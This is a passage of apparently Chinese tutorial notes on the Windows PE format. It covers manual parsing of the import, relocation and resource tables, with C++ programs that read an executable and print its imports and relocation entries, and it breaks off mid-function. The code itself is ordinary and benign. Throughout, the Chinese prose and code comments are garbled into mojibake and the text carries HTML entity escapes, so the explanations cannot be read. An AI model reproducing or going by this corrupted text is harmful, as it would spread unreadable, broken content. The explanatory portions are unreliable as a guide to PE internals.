Functionèµ·ä½œç”¨\n\næ‰‹å·¥è§£ææ•°æ®ç›®å½•è¡¨çš„ç¬¬1é¡¹ï¼Œå°±æ˜¯å¯¼å…¥è¡¨ä¿¡æ¯ï¼š\n\n\nRVAï¼š19CE90 â€”â€”â€”ã€‹ è½¬ä¸ºFOAï¼š B890\nSIZEï¼š0168\n\n\ntypedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;\n    union &#123;\n        DWORD Characteristics; \n        DWORD OriginalFirstThunk;&#x2F;&#x2F;(1) æŒ‡å‘å¯¼å…¥åç§°è¡¨(INT)çš„RAV*\n    &#125;;\n    DWORD   TimeDateStamp;\t&#x2F;&#x2F; (2) æ—¶é—´æ ‡è¯†\n    DWORD   ForwarderChain;\t&#x2F;&#x2F; (3) è½¬å‘é“¾ï¼Œå¦‚æœä¸è½¬å‘åˆ™æ­¤å€¼ä¸º0\n    DWORD   Name;\t\t&#x2F;&#x2F; (4) æŒ‡å‘å¯¼å…¥æ˜ åƒæ–‡ä»¶çš„åå­—*\n    DWORD   FirstThunk;\t&#x2F;&#x2F; (5) æŒ‡å‘å¯¼å…¥åœ°å€è¡¨ï¼ˆIATï¼‰çš„RAV*\n&#125; IMAGE_IMPORT_DESCRIPTOR;\n\nName: 0019E460 â€”â€“&gt; 19CE60\n\n\nOriginalFirstThunk: 0019D1CC â€”â€“&gt;19BBCC (INT)\n\n\nirstThunk: 001504D4 â€”â€“&gt; 14EED4ï¼ˆIATï¼‰\n\n\nåŠ è½½ä¹‹åï¼ŒINTä¸­çš„å†…å®¹è¿˜æ˜¯åŸæ¥çš„å†…å®¹\nåœ¨ODä¸­ï¼ŒåŠ è½½ä¹‹åï¼ŒIATé‡Œé¢ï¼Œå­˜å‚¨çš„å·²ç»æ˜¯å„ä¸ªAPIçš„åœ°å€äº†ã€‚\næµ‹è¯•ä»£ç &#x2F;&#x2F; 02_è§£æå¯¼å…¥è¡¨.cpp : æ­¤æ–‡ä»¶åŒ…å« &quot;main&quot; å‡½æ•°ã€‚ç¨‹åºæ‰§è¡Œå°†åœ¨æ­¤å¤„å¼€å§‹å¹¶ç»“æŸã€‚\n&#x2F;&#x2F;\n\n#include &lt;iostream&gt;\n#include &lt;Windows.h&gt;\n#define PATH L&quot;C:\\\\Users\\\\hugan\\\\Desktop\\\\FileCleaner2.0.exe&quot;\n&#x2F;&#x2F; åˆ¤æ–­æ˜¯ä¸æ˜¯PEæ–‡ä»¶\n\n\nDWORD RvaToFoa(char* lpImage, DWORD dwRva);\nBOOL IsPE_File(char* lpImage);\nvoid AnalyzeImportTabel(char* lpImage, bool bAnalyzeInt);\nint main()\n&#123;\n\t&#x2F;&#x2F;1 æ‰“å¼€æ–‡ä»¶\n\tHANDLE hFile &#x3D; CreateFile(\n\t\tPATH,\n\t\tGENERIC_ALL,\n\t\tNULL,\n\t\tNULL,\n\t\tOPEN_EXISTING,\n\t\tFILE_ATTRIBUTE_NORMAL,\n\t\tNULL\n\t);\n\t&#x2F;&#x2F;2 è·å–æ–‡ä»¶å¤§å°\n\tDWORD dwFileSize &#x3D; GetFileSize(hFile, NULL);\n\t&#x2F;&#x2F;3 ç”³è¯·ç©ºé—´å¹¶åˆå§‹åŒ–\n\tchar* buf &#x3D; new char[dwFileSize] &#123;0&#125;;\n\t&#x2F;&#x2F;4 è¯»å–æ–‡ä»¶\n\tDWORD dwRealSize &#x3D; 0;\n\tReadFile(hFile, buf, dwFileSize, &amp;dwRealSize, NULL);\n\t&#x2F;&#x2F;5 åˆ¤æ–­æ˜¯ä¸æ˜¯PEæ–‡ä»¶\n\tif (IsPE_File(buf) &#x3D;&#x3D; TRUE)\n\t&#123;\n\t\t&#x2F;&#x2F;printf(&quot;è¿™æ˜¯ä¸€ä¸ªPEæ–‡ä»¶&quot;);\n\t\tAnalyzeImportTabel(buf,true);\n\t&#125;\n\telse\n\t&#123;\n\t\tprintf(&quot;è¿™ä¸æ˜¯ä¸€ä¸ªPEæ–‡ä»¶&quot;);\n\t&#125;\n\tdelete[]buf;\n\tbuf &#x3D; nullptr;\n\treturn 0;\n&#125;\n\nDWORD RvaToFoa(char* lpImage, DWORD dwRva)\n&#123;\n\t&#x2F;&#x2F;1 è·å–åŒºæ®µè¡¨çš„èµ·å§‹ä½ç½®\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\tPIMAGE_SECTION_HEADER pHeader &#x3D; IMAGE_FIRST_SECTION(pNt);\n\n\tif (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)\n\t&#123;\n\t\treturn dwRva;\n\t&#125;\n\t&#x2F;&#x2F;2 å¾ªç¯åˆ¤æ–­RVAè½åœ¨äº†å“ªä¸ªåŒºæ®µä¸­\n\tfor (int i &#x3D; 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)\n\t&#123;\n\t\tDWORD dwSectionRva &#x3D; pHeader[i].VirtualAddress;\n\t\tDWORD dwSectionEndRva &#x3D; dwSectionRva + pHeader[i].SizeOfRawData;\n\t\tDWORD dwSectionFOA &#x3D; pHeader[i].PointerToRawData;\n\t\tif (dwRva &gt;&#x3D; dwSectionRva &amp;&amp; dwRva &lt;&#x3D; dwSectionEndRva)\n\t\t&#123;\n\t\t\tpHeader[i].VirtualAddress;\n\t\t\tDWORD dwFOA &#x3D; dwRva - dwSectionRva + dwSectionFOA;\n\t\t\treturn dwFOA;\n\t\t&#125;\n\t&#125;\n\treturn -1;\n&#125;\nBOOL IsPE_File(char* lpImage)\n&#123;\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tif (pDos-&gt;e_magic !&#x3D; IMAGE_DOS_SIGNATURE)\n\t&#123;\n\t\treturn FALSE;\n\t&#125;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\n\tif (pNt-&gt;Signature !&#x3D; IMAGE_NT_SIGNATURE)\n\t&#123;\n\t\treturn FALSE;\n\t&#125;\n\treturn TRUE;\n&#125;\n\nvoid AnalyzeImportTabel(char* lpImage,bool bAnalyzeInt)\n&#123;\n\t&#x2F;&#x2F;1 è·å–åˆ°å¯¼å…¥è¡¨çš„ç»“æ„\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\t&#x2F;&#x2F;1 è·å–åˆ°å¯¼å…¥è¡¨çš„æ•°æ®ç›®å½•ç»“æ„\n\tPIMAGE_DATA_DIRECTORY dwImportDir &#x3D; &amp;pNt-&gt;OptionalHeader.DataDirectory[1];\n\t&#x2F;&#x2F;1 å¯¼å…¥è¡¨çš„æ•°æ®ç›®å½•ç»“æ„ä¸­ï¼Œæœ‰å¯¼å‡ºè¡¨çš„RVAï¼Œå’±ä»¬éœ€è¦å°†å…¶è½¬æ¢ä¸ºFOAï¼Œæ‰èƒ½åœ¨æ–‡ä»¶ä¸­ä½¿ç”¨\n\tDWORD dwImportFOA &#x3D; RvaToFoa(lpImage, dwImportDir-&gt;VirtualAddress);\n\t&#x2F;&#x2F;1 å·²ç»å¾—åˆ°äº†FOAï¼Œç›´æ¥å°±èƒ½å¤Ÿæ‰¾åˆ°å¯¼å‡ºè¡¨çš„ç»“æ„\n\tPIMAGE_IMPORT_DESCRIPTOR pImportTable &#x3D; (PIMAGE_IMPORT_DESCRIPTOR)(lpImage + dwImportFOA);\n\t\n\t&#x2F;&#x2F;2 å¼€å§‹è§£æ\n\twhile (pImportTable-&gt;Name!&#x3D;0)\n\t&#123;\n\t\t&#x2F;&#x2F;2.1 å…ˆè§£æDLLçš„åå­—\n\t\t DWORD dwNameFoa &#x3D;  RvaToFoa(lpImage,pImportTable-&gt;Name);\n\t\t char* pDllName &#x3D; (char*)(dwNameFoa + lpImage);\n\t\t printf(&quot;DllName:%s\\n&quot;, pDllName);\n\n\t\t &#x2F;&#x2F;2.2 è§£æå‡½æ•°åå­—ï¼Œé€‰æ‹©ç”¨ä»€ä¹ˆå»è§£æ\n\t\t PIMAGE_THUNK_DATA32 pNameTable &#x3D; NULL;\n\t\tif (bAnalyzeInt &#x3D;&#x3D; true)\n\t\t&#123;\n\t\t\tDWORD Foa  &#x3D; RvaToFoa(lpImage, pImportTable-&gt;OriginalFirstThunk);\n\t\t\tpNameTable &#x3D; (PIMAGE_THUNK_DATA32)(lpImage + Foa);\n\t\t&#125;\n\t\telse\n\t\t&#123;\n\t\t\tDWORD Foa &#x3D; RvaToFoa(lpImage, pImportTable-&gt;FirstThunk);\n\t\t\tpNameTable &#x3D; (PIMAGE_THUNK_DATA32)(lpImage + Foa);\n\t\t&#125;\n\t\t&#x2F;&#x2F;2.3 å¼€å§‹è§£æåå­—\n\t\twhile (pNameTable-&gt;u1.Ordinal!&#x3D;0)\n\t\t&#123;\n\t\t\t&#x2F;&#x2F;2.3.1 åˆ¤æ–­æœ€é«˜ä½æ˜¯ä¸æ˜¯1\n\t\t\tif (IMAGE_SNAP_BY_ORDINAL32(pNameTable-&gt;u1.Ordinal)&#x3D;&#x3D;1)\n\t\t\t&#123;\n\t\t\t\t&#x2F;&#x2F;åªæœ‰åºå·\n\t\t\t\tprintf(&quot;  åºå·:%x,åç§°:NULL\\n&quot;, pNameTable-&gt;u1.Ordinal&amp;0x7FFFFFFF);\n\t\t\t&#125;\n\t\t\telse\n\t\t\t&#123;\n\t\t\t\t&#x2F;&#x2F;æ—¢æœ‰åå­—ï¼Œåˆæœ‰åºå·\n\t\t\t\tDWORD dwNameFoa &#x3D; RvaToFoa(lpImage, pNameTable-&gt;u1.AddressOfData);\n\t\t\t\tPIMAGE_IMPORT_BY_NAME pName  &#x3D; (PIMAGE_IMPORT_BY_NAME)(dwNameFoa + lpImage);\n\t\t\t\tprintf(&quot;  åºå·:%x,åç§°:%s\\n&quot;, pName-&gt;Hint,pName-&gt;Name);\n\t\t\t&#125;\n\t\t\tpNameTable++;\n\t\t&#125;\n\t\tprintf(&quot;----------------------------\\n&quot;);\n\t\tpImportTable++;\n\t&#125;\n&#125;\n\né‡å®šä½è¡¨ä»€ä¹ˆå«åšé‡å®šä½ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œexeçš„é»˜è®¤åŠ è½½åŸºå€æ˜¯0x0040 0000\nä¼šæœ‰ä¸€äº›ä»£ç ï¼Œæ˜¯è¿™æ ·çš„ï¼š\nlea eax, ds:[0x0040 1100]\npush eax\ncall printf\nä½†æ˜¯ç›®å‰æ¥çœ‹ï¼Œå‡ ä¹éƒ½ä¸ä¼šåŠ è½½åˆ°é»˜è®¤åŸºå€ä¸Šã€‚\næ¯”å¦‚è¯´ï¼ŒexeåŠ è½½åˆ°0x0050 0000ä¸Šï¼Œé‚£ä¹ˆä»¥ä¸Šçš„ä»£ç è¿˜å¯¹ä¹ˆï¼Ÿï¼Ÿ\nä¸å¯¹äº†ï¼Œæ€ä¹ˆæ‰èƒ½å¯¹å‘¢ï¼Ÿï¼Ÿ\nlea eax, ds:[0x0050 1100]\npush eax\ncall printf\nè¿™æ ·å°±å¯¹äº†ã€‚\nç”±äºä¸€ä¸ªæ¨¡å—åŠ è½½åˆ°ä»€ä¹ˆä½ç½®ï¼Œå‡ ä¹æ˜¯ä¸ç¡®å®šçš„ï¼Œæ‰€ä»¥æ¯æ¬¡ç¨‹åºè¿è¡Œï¼Œéƒ½éœ€è¦å°†ä½¿ç”¨äº†VAçš„åœ°æ–¹è¿›è¡Œä¸€æ¬¡ä¿®æ”¹ã€‚è¿™ä¸ªä¿®æ”¹çš„è¿‡ç¨‹å°±ç§°ä¹‹ä¸ºé‡å®šä½ã€‚\næœ‰ä¸€ä¸ªåŒºåŸŸå°±è®°å½•ç€ï¼Œç¨‹åºä¸­çš„å“ªäº›ä½ç½®ä½¿ç”¨äº†VAã€‚è¿™ä¸ªåŒºåŸŸå°±å«åšé‡å®šä½è¡¨ã€‚\nä¸ºä»€ä¹ˆæ¨¡å—ä¸åŠ è½½åˆ°é»˜è®¤åŸºå€ä¸Šï¼Ÿï¼Ÿ\n\nå¯¹äºdllæ¥è¯´ï¼Œä»–é»˜è®¤åŸºå€ä¸Šç»å¸¸å·²ç»è¢«åˆ«çš„æ¨¡å—ä½¿ç”¨äº†ã€‚\nå¯¹äºexeæ¥è¯´ï¼Œæ¯æ¬¡éƒ½åŠ è½½åˆ°é»˜è®¤åŸºå€ï¼Œæ˜¯ä¸€ä¸ªå±é™©çš„è¡Œä¸ºã€‚æ•°æ®å’Œä»£ç çš„åœ°å€æ¯æ¬¡éƒ½æ˜¯å›ºå®šçš„ï¼Œå°±å¾ˆå±é™©ã€‚å¯¹äºexeæ¥è¯´ï¼Œå°±æœ‰ä¸€ä¸ªéšæœºåŸºå€çš„åŠŸèƒ½ï¼Œä½¿å¾—æ¯æ¬¡è¿è¡Œï¼ŒåŸºå€éƒ½ä¸ä¸€æ ·ã€‚\n\næ‰‹å·¥è§£æé‡å®šä½typedef struct _IMAGE_BASE_RELOCATION &#123;\n    DWORD   VirtualAddress;\t&#x2F;&#x2F; (1) éœ€é‡å®šä½æ•°æ®çš„èµ·å§‹RVA\n    DWORD   SizeOfBlock;\t&#x2F;&#x2F; (2) æœ¬ç»“æ„ä¸TypeOffsetæ€»å¤§å°\n&#x2F;&#x2F;  WORD    TypeOffset[1];\t&#x2F;&#x2F; (3) åŸåˆ™ä¸Šä¸å±äºæœ¬ç»“æ„\n&#125; IMAGE_BASE_RELOCATION;\ntypedef  IMAGE_BASE_RELOCATION UNALIGNED IMAGE_BASE_RELOCATION;\n\n\n\nVirtualAddress:0A9000 â€”â€”-&gt;FOA:76E00\nsize:3ACC\n\n\nVirtualAddress:031000\nSizeofBlock:30\n\n\n\næ•°æ®\nåç§»\né‡å®šä½ä½ç½®\nFOA\nè¦é‡å®šä½çš„æ•°æ®\n\n\n\n3A7F\nA7F\n031000+A7F\n2E7F\n004A4840\n\n\n3A85\nA85\n031000+A85\n2E85\n0048FC88\n\n\n3A92\nA92\n031000+A92\n2E92\n004A4844\n\n\nå’±ä»¬å†ODä¸­ï¼Œå»çœ‹RVAæ˜¯031000+A7Fçš„åœ°å€ï¼Œå‘ç°ç¡®å®æ˜¯è¢«é‡å®šä½è¿‡çš„äº†ã€‚\n\n\næ€ä¹ˆé‡å®šä½çš„å‘¢ï¼Ÿï¼Ÿ\nåŸå§‹VA - é»˜è®¤åŸºå€ &#x3D; æ–°VA - æ–°åŸºå€\néªŒè¯ï¼š\n0x00D6 0000 - 0x0040 0000 + 004A4840 å¾—åˆ°å°±æ˜¯0xE04840\næµ‹è¯•ä»£ç #include &lt;iostream&gt;\n#include &lt;Windows.h&gt;\n#define PATH L&quot;C:\\\\Users\\\\hugan\\\\Desktop\\\\FileCleaner2.0.exe&quot;\n\n\n\nDWORD RvaToFoa(char* lpImage, DWORD dwRva);\nBOOL IsPE_File(char* lpImage);\nvoid AnalyzeReloc(char* lpImage);\nint main()\n&#123;\n\tsetlocale(LC_ALL, &quot;chs&quot;);\n\t&#x2F;&#x2F;1 æ‰“å¼€æ–‡ä»¶\n\tHANDLE hFile &#x3D; CreateFile(\n\t\tPATH,\n\t\tGENERIC_ALL,\n\t\tNULL,\n\t\tNULL,\n\t\tOPEN_EXISTING,\n\t\tFILE_ATTRIBUTE_NORMAL,\n\t\tNULL\n\t);\n\t&#x2F;&#x2F;2 è·å–æ–‡ä»¶å¤§å°\n\tDWORD dwFileSize &#x3D; GetFileSize(hFile, NULL);\n\t&#x2F;&#x2F;3 ç”³è¯·ç©ºé—´å¹¶åˆå§‹åŒ–\n\tchar* buf &#x3D; new char[dwFileSize] &#123;0&#125;;\n\t&#x2F;&#x2F;4 è¯»å–æ–‡ä»¶\n\tDWORD dwRealSize &#x3D; 0;\n\tReadFile(hFile, buf, dwFileSize, &amp;dwRealSize, NULL);\n\t&#x2F;&#x2F;5 åˆ¤æ–­æ˜¯ä¸æ˜¯PEæ–‡ä»¶\n\tif (IsPE_File(buf) &#x3D;&#x3D; TRUE)\n\t&#123;\n\t\t&#x2F;&#x2F;printf(&quot;è¿™æ˜¯ä¸€ä¸ªPEæ–‡ä»¶&quot;);\n\t\tAnalyzeReloc(buf);\n\t&#125;\n\telse\n\t&#123;\n\t\tprintf(&quot;è¿™ä¸æ˜¯ä¸€ä¸ªPEæ–‡ä»¶&quot;);\n\t&#125;\n\tdelete[]buf;\n\tbuf &#x3D; nullptr;\n\treturn 0;\n&#125;\n\nDWORD RvaToFoa(char* lpImage, DWORD dwRva)\n&#123;\n\t&#x2F;&#x2F;1 è·å–åŒºæ®µè¡¨çš„èµ·å§‹ä½ç½®\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\tPIMAGE_SECTION_HEADER pHeader &#x3D; IMAGE_FIRST_SECTION(pNt);\n\n\tif (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)\n\t&#123;\n\t\treturn dwRva;\n\t&#125;\n\t&#x2F;&#x2F;2 å¾ªç¯åˆ¤æ–­RVAè½åœ¨äº†å“ªä¸ªåŒºæ®µä¸­\n\tfor (int i &#x3D; 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)\n\t&#123;\n\t\tDWORD dwSectionRva &#x3D; pHeader[i].VirtualAddress;\n\t\tDWORD dwSectionEndRva &#x3D; dwSectionRva + pHeader[i].SizeOfRawData;\n\t\tDWORD dwSectionFOA &#x3D; pHeader[i].PointerToRawData;\n\t\tif (dwRva &gt;&#x3D; dwSectionRva &amp;&amp; dwRva &lt; dwSectionEndRva)\n\t\t&#123;\n\t\t\tpHeader[i].VirtualAddress;\n\t\t\tDWORD dwFOA &#x3D; dwRva - dwSectionRva + dwSectionFOA;\n\t\t\treturn dwFOA;\n\t\t&#125;\n\t&#125;\n\treturn -1;\n&#125;\nBOOL IsPE_File(char* lpImage)\n&#123;\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tif (pDos-&gt;e_magic !&#x3D; IMAGE_DOS_SIGNATURE)\n\t&#123;\n\t\treturn FALSE;\n\t&#125;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\n\tif (pNt-&gt;Signature !&#x3D; IMAGE_NT_SIGNATURE)\n\t&#123;\n\t\treturn FALSE;\n\t&#125;\n\treturn TRUE;\n&#125;\nstruct TYPEOFFSET &#123;\n\tWORD OFFSET : 12;\n\tWORD TYPE : 4;\n&#125;;\nvoid AnalyzeReloc(char* lpImage)\n&#123;\n\t&#x2F;&#x2F;1. æ‰¾åˆ°é‡å®šä½çš„ç»“æ„ä½“\n\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpImage;\n\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);\n\tPIMAGE_OPTIONAL_HEADER pOption &#x3D; &amp;pNt-&gt;OptionalHeader;\n\t&#x2F;&#x2F;1. å¾—åˆ°äº†é‡å®šä½çš„æ•°æ®ç›®å½•\n\tPIMAGE_DATA_DIRECTORY pRelocDir &#x3D; &amp;pOption-&gt;DataDirectory[5];\n\n\t&#x2F;&#x2F;2. å¾—åˆ°é‡å®šä½è¡¨\n\tPIMAGE_BASE_RELOCATION pReloc &#x3D; \n\t\t(PIMAGE_BASE_RELOCATION)\n\t(RvaToFoa(lpImage, pRelocDir-&gt;VirtualAddress)+ lpImage);\n\t&#x2F;&#x2F;3. å¼€å§‹è§£æé‡å®šä½\n\twhile (pReloc-&gt;SizeOfBlock!&#x3D;0)\n\t&#123;\n\t\t&#x2F;&#x2F;å¾—åˆ°æè¿°æ¯ä¸€ä¸ªä½ç½®åç§»çš„æ•°ç»„\n\t\tTYPEOFFSET* typeoffset &#x3D; (TYPEOFFSET*)(pReloc + 1);\n\t\tDWORD dwCount &#x3D; (pReloc-&gt;SizeOfBlock - 8) &#x2F; 2;\n\t\tDWORD dwBeginRva &#x3D;  pReloc-&gt;VirtualAddress;\n\t\tprintf(&quot;----------------------------------\\n&quot;);\n\t\tfor (int i &#x3D; 0; i &lt; dwCount; i++)\n\t\t&#123;\n\t\t\tif (typeoffset[i].TYPE&#x3D;&#x3D;3)\n\t\t\t&#123;\n\t\t\t\tDWORD dwRelocRva &#x3D; (dwBeginRva + typeoffset[i].OFFSET);\n\t\t\t\tprintf(&quot;è¦é‡å®šä½çš„ä½ç½®RVAï¼š%p\\n&quot;, dwRelocRva);\n\t\t\t\tPDWORD pRelocData &#x3D; (PDWORD)(RvaToFoa(lpImage, dwRelocRva) + lpImage);\n\t\t\t\tprintf(&quot;è¦é‡å®šä½çš„æ•°æ®ï¼š%p\\n&quot;, *pRelocData);\n\t\t\t&#125;\n\t\t\telse\n\t\t\t&#123;\n\t\t\t\tprintf(&quot;ç±»å‹æ˜¯%d&quot;, typeoffset[i].TYPE);\n\t\t\t&#125;\n\n\t\t&#125;\n\t\tprintf(&quot;----------------------------------\\n&quot;);\n\t\t&#x2F;&#x2F;æ‰¾åˆ°ä¸‹ä¸€ä¸ª0x1000å­—èŠ‚é‡å®šä½ä¿¡æ¯\n\t\tpReloc &#x3D; (PIMAGE_BASE_RELOCATION)((char*)pReloc + pReloc-&gt;SizeOfBlock);\n\t&#125;\n\n&#125;\n\nèµ„æºè¡¨èœå•ï¼Œå¯¹è¯æ¡†ï¼Œå›¾æ ‡ï¼Œå…‰æ ‡ï¼Œä½å›¾ï¼Œå·¥å…·æ â€¦..ä»–ä»¬ç§°ä¹‹ä¸ºèµ„æº,èµ„æºå°±æ˜¯PEæ–‡ä»¶åœ¨è¿è¡Œçš„æ—¶å€™éœ€è¦ä½¿ç”¨åˆ°çš„ä¸€äº›é€šç”¨æ•°æ®ã€‚ç¼–è¯‘çš„æ—¶å€™ï¼Œå°†ä»–ä»¬ç‹¬ç«‹ä¿å­˜åœ¨ä¸€ä¸ªåŒºåŸŸä¸­ã€‚\nè®°å½•è¿™äº›åŒºåŸŸçš„ä¸€ä¸ªç»“æ„ï¼Œå°±æ˜¯èµ„æºè¡¨äº†ã€‚\nç†è§£èµ„æºè¡¨å½“å’±ä»¬é€šè¿‡æ•°æ®ç›®å½•è¡¨æ‰¾åˆ°èµ„æºè¡¨çš„æ—¶å€™ï¼Œè¿™ä¸ªèµ„æºè¡¨åˆ†æˆäº†3å±‚ç»“æ„ï¼š\nç¬¬ä¸€å±‚ï¼šä¸€å…±æœ‰å¤šå°‘ç§èµ„æº\nç¬¬äºŒå±‚ï¼šè¿™ç§èµ„æºæœ‰å¤šå°‘ä¸ª\nç¬¬ä¸‰å±‚ï¼šè¿™ä¸ªèµ„æºçš„ä½ç½®\næ‰‹å·¥è§£æPEæ–‡ä»¶æ‰¾åˆ°èµ„æºè¡¨æ‰¾åˆ°èµ„æºè¡¨çš„æ•°æ®ç›®å½•ï¼š\nRVA:1AF000â€”â€”â€”â€“&gt; FOA:1A5400\nSIZE:153058\nåˆ†æç¬¬ä¸€å±‚\n\nNumberOfNamedEntriesï¼š0x2\nNumberOfIdEntriesï¼š0xC\nä»£è¡¨ç€åé¢æœ‰14ä¸ªä¸‹é¢çš„ç»“æ„ä½“ï¼š\ntypedef struct _IMAGE_RESOURCE_DIRECTORY_ENTRY &#123;\n    union &#123;\n        struct &#123;\n            DWORD NameOffset   :31;\t&#x2F;&#x2F; (1) èµ„æºååç§»\n            DWORD NameIsString:1;\t&#x2F;&#x2F; (2) èµ„æºåä¸ºå­—ç¬¦ä¸²\n        &#125;;\n        DWORD   Name;\t\t&#x2F;&#x2F; (3) èµ„æº&#x2F;è¯­è¨€ç±»å‹\n        WORD    Id;\t\t&#x2F;&#x2F; (4) èµ„æºæ•°å­—ID\n    &#125;;\n    union &#123;\n        DWORD   OffsetToData;\t&#x2F;&#x2F; (5) æ•°æ®åç§»åœ°å€\n        struct &#123;\n            DWORD   OffsetToDirectory:31;&#x2F;&#x2F; (6) å­ç›®å½•åç§»åœ°å€\n            DWORD   DataIsDirectory   :1;&#x2F;&#x2F; (7) æ•°æ®ä¸ºç›®å½•\n        &#125;;\n    &#125;;\n&#125;IMAGE_RESOURCE_DIRECTORY_ENTRY,*PIMAGE_RESOURCE_DIRECTORY_ENTRY;\n\nç¬¬ä¸€ä¸ªèµ„æºçš„ä¿¡æ¯ï¼š\nIdï¼š0x80008CC8 æœ€é«˜ä½æ˜¯1ï¼Œæ‰€ä»¥æ˜¯ä»¥å­—ç¬¦ä¸²ä¸ºæ ‡è¯†æ‰€ä»¥NameOffsetï¼š8CC8 è¿™æ˜¯ä¸€ä¸ªç›¸å¯¹äºèµ„æºè¡¨èµ·å§‹ä½ç½®çš„åç§»\nä»–ä¸æ˜¯RVA\n 1A5400+8CC8 &#x3D; 1AE0C8\n\n\nOffsetToDataï¼š0x80 00 00 80 æœ€é«˜ä½ä¸º1ï¼Œæ‰€ä»¥ä¸‹ä¸€å±‚æ˜¯ç›®å½•\nOffsetToDirectoryï¼š80 è¿™æ˜¯ä¸€ä¸ªç›¸å¯¹äºèµ„æºè¡¨èµ·å§‹ä½ç½®çš„åç§»\n ä»–ä¸æ˜¯RVA\n1A5400+80 &#x3D; 1A5480\nè¿™ä¸ªå°±æ˜¯ç¬¬äºŒå±‚çš„ä½ç½®\n\nIdï¼š0x800095E0\nNameOffsetï¼š95E0\n1A5400+95E0 &#x3D; 1AE9E0\n\n\nOffsetToDataï¼š0x80001890\nOffsetToDirectoryï¼š1890\n1A5400+1890 &#x3D; 1A6C90\nè¿™ä¸ªå°±æ˜¯ç¬¬ä¸‰å±‚çš„ä½ç½®äº†\n\nOffsetToDataï¼š5F20\n 1A5400+5E20 &#x3D;1AB220\nå’ŒLordPEç§è§£æå‡ºæ¥çš„æ˜¯ä¸€æ ·çš„\n\n\n#include &lt;iostream&gt;\n#include &lt;Windows.h&gt;\n#define PATH L&quot;C:\\\\Users\\\\SouLinker\\\\Desktop\\\\FileCleaner2.0.exe&quot;\n&#x2F;&#x2F; åˆ¤æ–­æ˜¯ä¸æ˜¯PEæ–‡ä»¶\n#include &lt;map&gt;\nusing std::map;\n\nmap&lt;int, const char*&gt; g_mapResourceInfo;\nmap&lt;const char*, const char*&gt; abc;\nvoid InitResourceInfo()\n&#123;\n\tg_mapResourceInfo[0x1] &#x3D; &quot;Cursor&quot;;\n\tg_mapResourceInfo[0x2] &#x3D; &quot;BitMap&quot;;\n\tg_mapResourceInfo[0x3] &#x3D; &quot;Icon&quot;;\n\tg_mapResourceInfo[0x4] &#x3D; &quot;Menu&quot;;\n\tg_mapResourceInfo[0x5] &#x3D; &quot;Dialog&quot;;\n\tg_mapResourceInfo[0x6] &#x3D; &quot;String Table&quot;;\n\tg_mapResourceInfo[0x7] &#x3D; &quot;Font Directory&quot;;\n\tg_mapResourceInfo[0x8] &#x3D; &quot;Font&quot;;\n\tg_mapResourceInfo[0x9] &#x3D; &quot;Accelerators&quot;;\n\tg_mapResourceInfo[0xA] &#x3D; &quot;UnFormatted&quot;;\n\tg_mapResourceInfo[0xB] &#x3D; &quot;Message Table&quot;;\n\tg_mapResourceInfo[0xC] &#x3D; &quot;Group Cursor&quot;;\n\tg_mapResourceInfo[0xE] &#x3D; &quot;Group Icon&quot;;\n\tg_mapResourceInfo[0x10] &#x3D; &quot;Version Information&quot;;\n&#125;\n\n\n\nDWORD RvaToFoa(char* lpImage, DWORD dwRva);\nBOOL IsPE_File(char* lpImage);\nvoid AnalyzeResource(char* lpImage);\nint main()\n&#123;\n\tsetlocale(LC_ALL, &quot;chs&quot;);\n\tInitResourceInfo();\n\t&#x2F;&#x2F;1 æ‰“å¼€æ–‡ä»¶\n\tHANDLE hFile &#x3D; CreateFile(\n\t\tPATH,\n\t\tGENERIC_ALL,\n\t\tNULL,\n\t\tNULL,\n\t\tOPEN_EXISTING,\n\t\tFILE_ATTRIBUTE_NORMAL,\n\t\tNULL\n\t);\n\t&#x2F;&#x2F;2 è·å–æ–‡ä»¶å¤§å°\n\tDWORD dwFileSize &#x3D; GetFileSize(hFile, NULL);\n\t&#x2F;&#x2F;3 ç”³è¯·ç©ºé—´å¹¶åˆå§‹åŒ–\n\tchar* buf &#x3D; new char[dwFileSize] &#123;0&#125;;\n\t&#x2F;&#x2F;4 è¯»å–æ–‡ä»¶\n\tDWORD dwRealSize &#x3D; 0;\n\tReadFile(hFile, buf, dwFileSize, &amp;dwRealSize, NULL);\n\t&#x2F;&#x2F;5 åˆ¤æ–­æ˜¯ä¸æ˜¯PEæ–‡ä»¶\n\tif (IsPE_File(buf) &#x3D;&#x3D; TRUE)\n\t&#123;\n\t\t&#x2F;&#x2F;printf(&quot;è¿™æ˜¯ä¸€ä¸ªPEæ–‡ä»¶&quot;);\n\t\tAnalyzeResource(buf);\n\t&#125;\n\telse\n\t&#123;\n\t\tprintf(&quot;è¿™ä¸æ˜¯ä¸€ä¸ªPEæ–‡ä»¶&quot;);\n\t&#125;\n\tdelete[]buf;\n\tbuf &#x3D; nullptr;\n\treturn 0;\n&#125;\n\nDWORD RvaToFoa(char* lpImage, DWORD dwRva)\n&#123;\n\t&#x2F;&#x2F;1 